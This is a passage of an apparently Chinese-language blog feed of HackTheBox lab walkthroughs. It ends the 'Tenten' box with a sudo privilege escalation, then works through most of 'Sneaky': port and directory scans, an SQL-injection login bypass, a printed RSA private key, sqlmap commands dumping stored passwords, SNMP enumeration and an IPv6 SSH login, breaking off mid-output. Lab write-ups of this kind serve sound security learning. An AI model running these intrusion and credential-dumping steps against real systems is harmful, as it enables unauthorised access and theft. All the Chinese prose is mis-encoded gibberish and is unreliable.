<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ssh -i id_rsa takis@10.10.10.10</span><br><span class="line">Enter passphrase for key &#39;id_rsa&#39;: </span><br><span class="line">Welcome to Ubuntu 16.04.2 LTS (GNU&#x2F;Linux 4.4.0-62-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:&#x2F;&#x2F;help.ubuntu.com</span><br><span class="line"> * Management:     https:&#x2F;&#x2F;landscape.canonical.com</span><br><span class="line"> * Support:        https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage</span><br><span class="line"></span><br><span class="line">65 packages can be updated.</span><br><span class="line">39 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Fri May  5 23:05:36 2017</span><br><span class="line">takis@tenten:~$ whoami</span><br><span class="line">takis</span><br><span class="line">takis@tenten:~$ ls -la &#x2F;home&#x2F;takis</span><br><span class="line">total 48</span><br><span class="line">drwx------ 5 takis takis 4096 Apr 12  2017 .</span><br><span class="line">drwxr-xr-x 5 root  root  4096 Apr 12  2017 ..</span><br><span class="line">-rw------- 1 root  root     1 Dec 24  2017 .bash_history</span><br><span class="line">-rw-r--r-- 1 takis takis  220 Apr 12  2017 .bash_logout</span><br><span class="line">-rw-r--r-- 1 takis takis 3771 Apr 12  2017 .bashrc</span><br><span class="line">drwx------ 2 takis takis 4096 Apr 12  2017 .cache</span><br><span class="line">-rw------- 1 root  root   162 Apr 12  2017 .mysql_history</span><br><span class="line">drwxrwxr-x 2 takis takis 4096 Apr 12  2017 .nano</span><br><span class="line">-rw-r--r-- 1 takis takis  655 Apr 12  2017 .profile</span><br><span class="line">drwx------ 2 takis takis 4096 Apr 12  2017 .ssh</span><br><span class="line">-rw-r--r-- 1 takis takis    0 Apr 12  2017 .sudo_as_admin_successful</span><br><span class="line">-r--r--r-- 1 takis takis   33 Apr 12  2017 user.txt</span><br><span class="line">-rw-r--r-- 1 root  root   217 Apr 12  2017 .wget-hsts</span><br></pre></td></tr></table></figure>
<p>ææƒå°±å¾ˆç®€å•äº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">takis@tenten:~$ sudo -l</span><br><span class="line">Matching Defaults entries for takis on tenten:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User takis may run the following commands on tenten:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">    (ALL) NOPASSWD: &#x2F;bin&#x2F;fuckin</span><br><span class="line">takis@tenten:~$ ls -la &#x2F;bin&#x2F;fuckin</span><br><span class="line">-rwxr-xr-x 1 root root 24 Apr 12  2017 &#x2F;bin&#x2F;fuckin</span><br><span class="line">takis@tenten:~$ cat &#x2F;bin&#x2F;fuckin</span><br><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">$1 $2 $3 $4</span><br><span class="line">takis@tenten:~$ sudo &#x2F;bin&#x2F;fuckin cat &#x2F;root&#x2F;root.txt</span><br><span class="line">f9f7[------------------]f603</span><br></pre></td></tr></table></figure>
<h2 id="0x04-Summary">0x04 Summary</h2>
<p>Tentenç®—æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¤è€çš„Linuxé¶æœºäº†ï¼Œå°±æƒå½“å¼€é˜”çŸ¥è¯†é¢ï¼Œè¿™ä¸ªé¶æœºçš„é£æ ¼å’ŒCTFçš„æ¯”èµ›é¢˜å¾ˆåƒï¼Œé€šè¿‡æ‰¾wordpressç«™ç‚¹çš„æ’ä»¶æ¼æ´ï¼Œä»¥åŠå¸¸è§çš„wordpressä¸Šä¼ è·¯å¾„æ¥æ‰¾åˆ°éšå†™<code>id_rsa</code>æ–‡ä»¶çš„å›¾ç‰‡ã€‚ä¹‹åçš„è¿‡ç¨‹å°±æ˜¯æ¯”è¾ƒç®€å•çš„ææƒæ“ä½œäº†ï¼Œæ–¹æ³•æœ‰å¾ˆå¤šã€‚è¿™ä¸ªé¶æœºç®—æ˜¯æ¯”è¾ƒç®€å•çš„å§ï¼Œå†™äº†ä¸€ä¸ªå°è„šæœ¬æ¥çˆ†ç ´ç›®å½•ï¼Œä¸€å¤©æå®šï¼Œæ˜å¤©ç»§ç»­ã€‚</p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Sneaky Walkthrough</title>
    <url>/Target_drone/HackTheBox/7.HTB-Sneaky-walkthrough/</url>
    <content><![CDATA[<blockquote>
<p>ä¸å¾—ä¸è¯´è¿™ä¸ªé¶æœºçš„è´¨é‡éå¸¸é«˜ï¼Œå€¼å¾—ä¸€åšã€‚ï¼ˆå‡è£…å®‰æ…°ä¸€ä¸‹è‡ªå·±vipæ²¡æœ‰ç™½å……ï¼‰</p>
</blockquote>
<h1 id="HTB-Sneaky-Walkthrough">HTB::Sneaky Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200319101112.png" alt=""></p>
<h3 id="0x02-Prior-knowledge">0x02 Prior knowledge</h3>
<h3 id="IPv6">IPv6</h3>
<p><a href="https://www.w3cschool.cn/ipv6/ipv6_address_types.html">https://www.w3cschool.cn/ipv6/ipv6_address_types.html</a></p>
<p><a href="http://www.what21.com/sys/view/net_ipv6_1536653956137.html">http://www.what21.com/sys/view/net_ipv6_1536653956137.html</a></p>
<p>ä¸»è¦ææ¸…æ¥šIPv6çš„åœ°å€ç±»å‹å’Œæ ¼å¼ï¼Œä»¥åŠæœ¬æœºMacåœ°å€è½¬æ¢æˆæœ¬åœ°å”¯ä¸€åœ°å€çš„è®¡ç®—æ–¹æ³•</p>
<h3 id="SNMP">SNMP</h3>
<p><a href="https://www.manageengine.com/network-monitoring/what-is-snmp.html">https://www.manageengine.com/network-monitoring/what-is-snmp.html</a></p>
<p>å¯¹äºSNMPåè®®ï¼Œä¸»è¦æ˜¯äº†è§£å®ƒçš„ç®¡ç†ä¿¡æ¯åº“(MIBï¼ŒManagement Information Base)å’Œå¯¹è±¡æ ‡è¯†ç¬¦(OIDï¼ŒObject ID)æ¦‚å¿µã€‚ç®¡ç†ä¿¡æ¯åº“ï¼ˆMIBï¼‰æ˜¯ç”¨äºç®¡ç†ç½‘ç»œå…ƒç´ çš„ä¿¡æ¯çš„é›†åˆï¼Œ ç”±å¯¹è±¡æ ‡è¯†ç¬¦ï¼ˆOIDï¼‰æ ‡è¯†çš„ç®¡ç†å¯¹è±¡ç»„æˆäº†ä¸‹é¢è¿™ç§æ ‘çŠ¶ç»“æ„ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200321120643.png" alt=""></p>
<h3 id="Buffer-overflow">Buffer overflow</h3>
<h2 id="0x03-Tools-and-Tips">0x03 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>sqlmap</li>
<li>snmpwalk OR snmp-check</li>
<li>gdb</li>
<li>Basic SQL Injection</li>
<li>Enumerating SNMP</li>
<li>Basic buffer overflow exploitation</li>
</ul>
<h2 id="0x04-Pentesting">0x04 Pentesting</h2>
<p>nmapæ‰«æé¶æœºç«¯å£ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 10.10.10.20</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: Under Development!</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; ).</span><br><span class="line">TCP&#x2F;IP fingerprint:</span><br><span class="line">OS:SCAN(V&#x3D;7.80%E&#x3D;4%D&#x3D;3&#x2F;19%OT&#x3D;80%CT&#x3D;1%CU&#x3D;37304%PV&#x3D;Y%DS&#x3D;2%DC&#x3D;T%G&#x3D;Y%TM&#x3D;5E72D70</span><br><span class="line">OS:C%P&#x3D;i686-pc-windows-windows)SEQ(SP&#x3D;107%GCD&#x3D;1%ISR&#x3D;10D%TI&#x3D;Z%CI&#x3D;I%II&#x3D;I%TS&#x3D;8</span><br><span class="line">OS:)SEQ(CI&#x3D;I%II&#x3D;I)OPS(O1&#x3D;M54BST11NW7%O2&#x3D;M54BST11NW7%O3&#x3D;M54BNNT11NW7%O4&#x3D;M54B</span><br><span class="line">OS:ST11NW7%O5&#x3D;M54BST11NW7%O6&#x3D;M54BST11)WIN(W1&#x3D;7120%W2&#x3D;7120%W3&#x3D;7120%W4&#x3D;7120%W</span><br><span class="line">OS:5&#x3D;7120%W6&#x3D;7120)ECN(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;7210%O&#x3D;M54BNNSNW7%CC&#x3D;Y%Q&#x3D;)T1(R&#x3D;Y%DF&#x3D;Y</span><br><span class="line">OS:%T&#x3D;40%S&#x3D;O%A&#x3D;S+%F&#x3D;AS%RD&#x3D;0%Q&#x3D;)T2(R&#x3D;N)T3(R&#x3D;N)T4(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;A%A&#x3D;Z%F</span><br><span class="line">OS:&#x3D;R%O&#x3D;%RD&#x3D;0%Q&#x3D;)T5(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;Z%A&#x3D;S+%F&#x3D;AR%O&#x3D;%RD&#x3D;0%Q&#x3D;)T6(R&#x3D;Y%DF&#x3D;Y%</span><br><span class="line">OS:T&#x3D;40%W&#x3D;0%S&#x3D;A%A&#x3D;Z%F&#x3D;R%O&#x3D;%RD&#x3D;0%Q&#x3D;)T7(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;Z%A&#x3D;S+%F&#x3D;AR%O&#x3D;%RD</span><br><span class="line">OS:&#x3D;0%Q&#x3D;)U1(R&#x3D;Y%DF&#x3D;N%T&#x3D;40%IPL&#x3D;164%UN&#x3D;0%RIPL&#x3D;G%RID&#x3D;G%RIPCK&#x3D;G%RUCK&#x3D;G%RUD&#x3D;G)IE</span><br><span class="line">OS:(R&#x3D;Y%DFI&#x3D;N%T&#x3D;40%CD&#x3D;S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 21&#x2F;tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   228.00 ms 10.10.16.1</span><br><span class="line">2   296.00 ms 10.10.10.20</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 523.52 seconds</span><br></pre></td></tr></table></figure>
<p>è®¿é—®80ç«¯å£çš„ç«™ç‚¹ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200319103046.png" alt=""></p>
<p>æ˜¯ä¸€ä¸ªé™æ€é¡µé¢ï¼Œç”¨dirsearchæ‰«æä¸€ä¸‹ç«™ç‚¹ç›®å½•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Target: http:&#x2F;&#x2F;10.10.10.20&#x2F;</span><br><span class="line"></span><br><span class="line">[22:26:48] Starting: </span><br><span class="line">[22:26:55] 403 -  289B  - &#x2F;.ht_wsr.txt</span><br><span class="line">[22:26:55] 403 -  282B  - &#x2F;.hta</span><br><span class="line">[22:26:55] 403 -  293B  - &#x2F;.htaccess-local</span><br><span class="line">[22:26:55] 403 -  293B  - &#x2F;.htaccess-marco</span><br><span class="line">[22:26:55] 403 -  291B  - &#x2F;.htaccess-dev</span><br><span class="line">[22:26:55] 403 -  291B  - &#x2F;.htaccess.BAK</span><br><span class="line">[22:26:55] 403 -  292B  - &#x2F;.htaccess.bak1</span><br><span class="line">[22:26:55] 403 -  291B  - &#x2F;.htaccess.old</span><br><span class="line">[22:26:55] 403 -  294B  - &#x2F;.htaccess.sample</span><br><span class="line">[22:26:55] 403 -  292B  - &#x2F;.htaccess.orig</span><br><span class="line">[22:26:55] 403 -  291B  - &#x2F;.htaccess.txt</span><br><span class="line">[22:26:55] 403 -  292B  - &#x2F;.htaccess.save</span><br><span class="line">[22:26:55] 403 -  293B  - &#x2F;.htaccess_extra</span><br><span class="line">[22:26:55] 403 -  292B  - &#x2F;.htaccess_orig</span><br><span class="line">[22:26:55] 403 -  290B  - &#x2F;.htaccessBAK</span><br><span class="line">[22:26:55] 403 -  290B  - &#x2F;.htaccess_sc</span><br><span class="line">[22:26:55] 403 -  290B  - &#x2F;.htaccessOLD</span><br><span class="line">[22:26:55] 403 -  288B  - &#x2F;.htaccess~</span><br><span class="line">[22:26:55] 403 -  291B  - &#x2F;.htaccessOLD2</span><br><span class="line">[22:26:55] 403 -  286B  - &#x2F;.htgroup</span><br><span class="line">[22:26:55] 403 -  291B  - &#x2F;.htpasswd-old</span><br><span class="line">[22:26:55] 403 -  292B  - &#x2F;.htpasswd_test</span><br><span class="line">[22:26:55] 403 -  288B  - &#x2F;.htpasswds</span><br><span class="line">[22:26:56] 403 -  286B  - &#x2F;.htusers</span><br><span class="line">[22:28:10] 301 -  307B  - &#x2F;dev  -&gt;  http:&#x2F;&#x2F;10.10.10.20&#x2F;dev&#x2F;</span><br><span class="line">[22:28:10] 200 -  464B  - &#x2F;dev&#x2F;</span><br><span class="line">[22:28:30] 200 -  183B  - &#x2F;index.html</span><br><span class="line">[22:29:14] 403 -  291B  - &#x2F;server-status</span><br><span class="line">[22:29:14] 403 -  292B  - &#x2F;server-status&#x2F;</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
<p>å‘ç°äº†ä¸€ä¸ªdevè·¯å¾„ï¼Œæ˜¯ä¸€ä¸ªåå°ç™»å½•é¡µé¢ï¼Œç”¨ä¸‡èƒ½å¯†ç æ³¨å…¥è¯•ä¸€ä¸‹ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200319104954.png" alt=""></p>
<p>æˆåŠŸç™»å½•ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200319105024.png" alt=""></p>
<p>æœ‰ä¸€ä¸ªadminç”¨æˆ·ï¼Œè¿˜æœ‰ä¸€ä¸ªSSH keyï¼Œä½†æ˜¯æ²¡æœ‰ç«¯å£ç™»å½•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEAvQxBD5yRBGemrZI9F0O13j15wy9Ou8Z5Um2bC0lMdV9ckyU5</span><br><span class="line">Lc4V+rY81lS4cWUx&#x2F;EsnPrUyECJTtVXG1vayffJISugpon49LLqABZbyQzc4GgBr</span><br><span class="line">3mi0MyfiGRh&#x2F;Xr4L0+SwYdylkuX72E7rLkkigSt4s&#x2F;zXp5dJmL2RBZDJf1Qh6Ugb</span><br><span class="line">yDxG2ER49&#x2F;wbdet8BKZ9EG7krGHgta4mfqrBbZiSBG1ST61VFC+G6v6GJQjC02cn</span><br><span class="line">cb+zfPcTvcP0t63kdEreQbdASYK6&#x2F;e7Iih&#x2F;5eBy3i8YoNJd6Wr8&#x2F;qVtmB+FuxcFj</span><br><span class="line">oOqS9z0+G2keBfFlQzHttLr3mh70tgSA0fMKMwIDAQABAoIBAA23XOUYFAGAz7wa</span><br><span class="line">Nyp&#x2F;9CsaxMHfpdPD87uCTlSETfLaJ2pZsgtbv4aAQGvAm91GXVkTztYi6W34P6CR</span><br><span class="line">h6rDHXI76PjeXV73z9J1+aHuMMelswFX9Huflyt7AlGV0G&#x2F;8U&#x2F;lcx1tiWfUNkLdC</span><br><span class="line">CphCICnFEK3mc3Mqa+GUJ3iC58vAHAVUPIX&#x2F;cUcblPDdOmxvazpnP4PW1rEpW8cT</span><br><span class="line">OtsoA6quuPRn9O4vxDlaCdMYXfycNg6Uso0stD55tVTHcOz5MXIHh2rRKpl4817a</span><br><span class="line">I0wXr9nY7hr+ZzrN0xy5beZRqEIdaDnQG6qBJFeAOi2d7RSnSU6qH08wOPQnsmcB</span><br><span class="line">JkQxeUkCgYEA3RBR&#x2F;0MJErfUb0+vJgBCwhfjd0x094mfmovecplIUoiP9Aqh77iz</span><br><span class="line">5Kn4ABSCsfmiYf6kN8hhOzPAieARf5wbYhdjC0cxph7nI8P3Y6P9SrY3iFzQcpHY</span><br><span class="line">ChzLrzkvV4wO+THz+QVLgmX3Yp1lmBYOSFwIirt&#x2F;MmoSaASbqpwhPSUCgYEA2uym</span><br><span class="line">+jZ9l84gdmLk7Z4LznJcvA54GBk6ESnPmUd8BArcYbla5jdSCNL4vfX3+ZaUsmgu</span><br><span class="line">7Z9lLVVv1SjCdpfFM79SqyxzwmclXuwknC2iHtHKDW5aiUMTG3io23K58VDS0VwC</span><br><span class="line">GR4wYcZF0iH&#x2F;t4tn02qqOPaRGJAB3BD&#x2F;B8bRxncCgYBI7hpvITl8EGOoOVyqJ8ne</span><br><span class="line">aK0lbXblN2UNQnmnywP+HomHVH6qLIBEvwJPXHTlrFqzA6Q&#x2F;tv7E3kT195MuS10J</span><br><span class="line">VnfZf6pUiLtupDcYi0CEBmt5tE0cjxr78xYLf80rj8xcz+sSS3nm0ib0RMMAkr4x</span><br><span class="line">hxNWWZcUFcRuxp5ogcvBdQKBgQDB&#x2F;AYtGhGJbO1Y2WJOpseBY9aGEDAb8maAhNLd</span><br><span class="line">1&#x2F;iswE7tDMfdzFEVXpNoB0Z2UxZpS2WhyqZlWBoi&#x2F;93oJa1on&#x2F;QJlvbv4GO9y3LZ</span><br><span class="line">LJpFwtDNu+XfUJ7irbS51tuqV1qmhmeZiCWIzZ5ahyPGqHEUZaR1mw2QfTIYpLrG</span><br><span class="line">UkbZGwKBgGMjAQBfLX0tpRCPyDNaLebFEmw4yIhB78ElGv6U1oY5qRE04kjHm1k&#x2F;</span><br><span class="line">Hu+up36u92YlaT7Yk+fsk&#x2F;k+IvCPum99pF3QR5SGIkZGIxczy7luxyxqDy3UfG31</span><br><span class="line">rOgybvKIVYntsE6raXfnYsEcvfbaE0BsREpcOGYpsE+i7xCRqdLb</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<p>ç”¨BurpSuiteæŠŠè¯·æ±‚æ•°æ®åŒ…ä¿å­˜æˆ<code>sneaky.req</code>æ–‡ä»¶ï¼Œå†ç”¨sqlmapè·‘ä¸€ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sqlmap -r sneaky.req -p pass --dbms mysql --level 4 --risk 3 --dbs</span><br><span class="line">...</span><br><span class="line">[00:33:32] [INFO] fetching database names</span><br><span class="line">available databases [4]:</span><br><span class="line">[*] dev</span><br><span class="line">[*] information_schema             </span><br><span class="line">[*] mysql                </span><br><span class="line">[*] performance_schema</span><br><span class="line"></span><br><span class="line">$ sqlmap -r sneaky.req -p pass --dbms mysql --level 4 --risk 3 -D &#39;dev&#39; --tables</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$ sqlmap -r sneaky.req -p pass --dbms mysql --level 4 --risk 3 -D &#39;dev&#39; -T &#39;users&#39; --columns</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$ sqlmap -r sneaky.req -p pass --dbms mysql --level 4 --risk 3 -D &#39;dev&#39; -T &#39;users&#39; -C &#39;name, pass&#39; --dump</span><br><span class="line">[00:38:48] [INFO] fetching entries of column(s) &#39;&#96;name&#96;, pass&#39; for table &#39;users&#39; in database &#39;dev&#39;</span><br><span class="line">Database: dev</span><br><span class="line">Table: users</span><br><span class="line">[2 entries]</span><br><span class="line">+--------------+----------------------+</span><br><span class="line">| name         | pass                 |</span><br><span class="line">+--------------+----------------------+</span><br><span class="line">| admin        | sup3rstr0ngp4ssf0r4d |</span><br><span class="line">| thrasivoulos | sup3rstr0ngp4ssf0r4d |</span><br><span class="line">+--------------+----------------------+</span><br></pre></td></tr></table></figure>
<p>æ‰«å‡ºäº†ä¸¤ä¸ªç”¨æˆ·ï¼Œæ²¡å•¥æ€è·¯äº†ï¼Œçœ‹ä¸€ä¸‹writeupæç¤ºï¼Œå¥½å§ï¼Œè¿˜è¦æ‰«æUDPç«¯å£ï¼Œ161ç«¯å£ä¸Šè¿è¡ŒsnmpæœåŠ¡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PORT      STATE         SERVICE        VERSION</span><br><span class="line">161&#x2F;udp   open          snmp           SNMPv1 server; net-snmp SNMPv3 server (public)</span><br><span class="line">| snmp-info:</span><br><span class="line">|   enterprise: net-snmp</span><br><span class="line">|   engineIDFormat: unknown</span><br><span class="line">|   engineIDData: fcf2da02d0831859</span><br><span class="line">|   snmpEngineBoots: 8</span><br><span class="line">|_  snmpEngineTime: 6h24m47s</span><br><span class="line">| snmp-interfaces:</span><br><span class="line">|   lo</span><br><span class="line">|     IP address: 127.0.0.1  Netmask: 255.0.0.0</span><br><span class="line">|     Type: softwareLoopback  Speed: 10 Mbps</span><br><span class="line">|     Traffic stats: 9.74 Kb sent, 9.74 Kb received</span><br><span class="line">|   eth0</span><br><span class="line">|     IP address: 10.10.10.20  Netmask: 255.255.255.0</span><br><span class="line">|     MAC address: 00:50:56:b9:37:ed (VMware)</span><br><span class="line">|     Type: ethernetCsmacd  Speed: 4 Gbps</span><br><span class="line">|_    Traffic stats: 7.92 Mb sent, 7.47 Mb received</span><br><span class="line">| snmp-netstat:</span><br><span class="line">|   TCP  127.0.0.1:3306       0.0.0.0:0</span><br><span class="line">|_  UDP  0.0.0.0:161          *:*</span><br></pre></td></tr></table></figure>
<p>æ—¢ç„¶IPv4çš„é˜²ç«å¢™æ²¡æœ‰å¼€æ”¾22ç«¯å£ï¼Œæ¢ä¸ªæ€è·¯çœ‹ä¸€ä¸‹IPv6çš„ç«¯å£å¼€æ”¾æƒ…å†µï¼Œå‰æå°±æ˜¯æˆ‘ä»¬çŸ¥é“é¶æœºçš„IPv6æœ¬åœ°å”¯ä¸€åœ°å€ï¼ˆç±»ä¼¼IPv6çš„å†…ç½‘/ç§ç½‘åœ°å€ï¼‰ï¼Œè¿™é‡Œå°±è¦åˆ©ç”¨SNMPæœåŠ¡ã€‚</p>
<p>ä½¿ç”¨snmpwalkå·¥å…·æ‰«æé¶æœºä¸Šçš„è®¾å¤‡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">snmpwalk -v2c -c public 10.10.10.20 &gt; sneakly.snmp</span><br></pre></td></tr></table></figure>
<p>æ‰“å¼€æ–‡ä»¶ä¹‹åç›´æ¥å…¨å±€æœç´¢<code>10.10.10.20</code>ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200321122646.png" alt=""></p>
<p>æˆ‘ä»¬å°±èƒ½æ‰¾åˆ°é¶æœºçš„IPv6åœ°å€(åè¿›åˆ¶è¡¨ç¤º)</p>
<blockquote>
<p>iso.3.6.1.2.1.4.34.1.4.2.16. è®¾å¤‡çš„OIDå·</p>
</blockquote>
<p>è½¬æ¢æˆåå…­è¿›åˆ¶è¡¨ç¤º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dead:beef::0250:56ff:feb9:2771</span><br></pre></td></tr></table></figure>
<p>å½“ç„¶ï¼Œæˆ‘ä¸€å¼€å§‹æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ä¹Ÿæ˜¯ä¸€è„¸æ‡µé€¼çš„çŠ¶æ€ï¼Œå®Œå…¨ä¸çŸ¥é“è¾“å‡ºçš„æ˜¯ä»€ä¹ˆæ„æ€ï¼Œæˆ‘ä»¬å¯ä»¥é€‚å½“çš„è®©snmpwalkè¾“å‡ºçš„å†…å®¹æ›´åŠ å¯è¯»ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># å®‰è£…è½¯ä»¶</span><br><span class="line">sudo apt-get install snmp-mibs-downloader</span><br><span class="line"></span><br><span class="line"># ç¼–è¾‘æ–‡ä»¶ï¼Œæ³¨é‡Šæ‰mibs:è¿™ä¸€è¡Œ</span><br><span class="line">vim &#x2F;etc&#x2F;snmp&#x2F;snmp.conf</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å†æ‰§è¡Œsnmpwalkå‘½ä»¤ï¼Œè¿™ä¸€æ¬¡å¯ä»¥å†åŠ ä¸€ä¸ªOIDå‚æ•°å‡å°‘è¾“å‡ºçš„å†…å®¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ snmpwalk -v2c -c public 10.10.10.20 1.3.6.1.2.1.4.34.1.4.2.16</span><br><span class="line">IP-MIB::ipAddressType.ipv6.&quot;00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:01&quot; &#x3D; INTEGER: unicast(1)</span><br><span class="line">IP-MIB::ipAddressType.ipv6.&quot;de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:27:71&quot; &#x3D; INTEGER: unicast(1)</span><br><span class="line">IP-MIB::ipAddressType.ipv6.&quot;fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:27:71&quot; &#x3D; INTEGER: unicast(1)</span><br></pre></td></tr></table></figure>
<p>æ•´ç†ä¸€ä¸‹å’Œåˆšåˆšå¾—åˆ°çš„åœ°å€æ˜¯ä¸€æ ·çš„ã€‚</p>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨é¶æœºä½œè€…å†™çš„ä¸€ä¸ªPythonè„šæœ¬å¾—åˆ°é¶æœºçš„IPv6åœ°å€ï¼Œ<a href="https://github.com/trickster0/Enyx">ä¼ é€é—¨</a>ğŸšª</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200321141207.png" alt=""></p>
<blockquote>
<p>æ³¨æ„ï¼Œè¦æŠŠ/etc/snmp/snmp.confæ–‡ä»¶æ”¹å›æ¥ï¼Œä¸ç„¶ä¼šè¿è¡ŒæŠ¥é”™</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nmap -sV -A -6 dead:beef::0250:56ff:feaa:0b69</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.50 ( https:&#x2F;&#x2F;nmap.org ) at 2017-07-30 22:11 IST</span><br><span class="line">Nmap scan report for dead:beef::250:56ff:feaa:b69</span><br><span class="line">Host is up (0.14s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 5d:5d:2a:97:85:a1:20:e2:26:e4:13:54:58:d6:a4:22 (DSA)</span><br><span class="line">|   2048 a2:00:0e:99:0f:d3:ed:b0:19:d4:6b:a8:b1:93:d9:87 (RSA)</span><br><span class="line">|   256 e3:29:c4:cb:87:98:df:99:6f:36:9f:31:50:e3:b9:42 (ECDSA)</span><br><span class="line">|_  256 e6:85:a8:f8:62:67:f7:01:28:a1:aa:00:b5:60:f2:21 (EdDSA)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: 400 Bad Request</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| address-info: </span><br><span class="line">|   IPv6 EUI-64: </span><br><span class="line">|     MAC address: </span><br><span class="line">|       address: 00:50:56:aa:0b:69</span><br><span class="line">|_      manuf: VMware</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 35.18 seconds</span><br></pre></td></tr></table></figure>
<p>å†ç”¨ä¹‹å‰å¾—åˆ°çš„SSH keyç™»å½•é¶æœºï¼Œæ‹¿åˆ°user.txtï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Î» ssh -6 -i sneaky.key thrasivoulos@dead:beef::0250:56ff:feb9:2771</span><br><span class="line">The authenticity of host &#39;dead:beef::250:56ff:feb9:2771 (dead:beef::250:56ff:feb9:2771)&#39; can&#39;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:KCwXgk+ryPhJU+UhxyHAO16VCRFrty3aLPWPSkq&#x2F;E2o.</span><br><span class="line">Are you sure you want to continue connecting (yes&#x2F;no)? yes</span><br><span class="line">Warning: Permanently added &#39;dead:beef::250:56ff:feb9:2771&#39; (ECDSA) to the list of known hosts.</span><br><span class="line">Welcome to Ubuntu 14.04.5 LTS (GNU&#x2F;Linux 4.4.0-75-generic i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  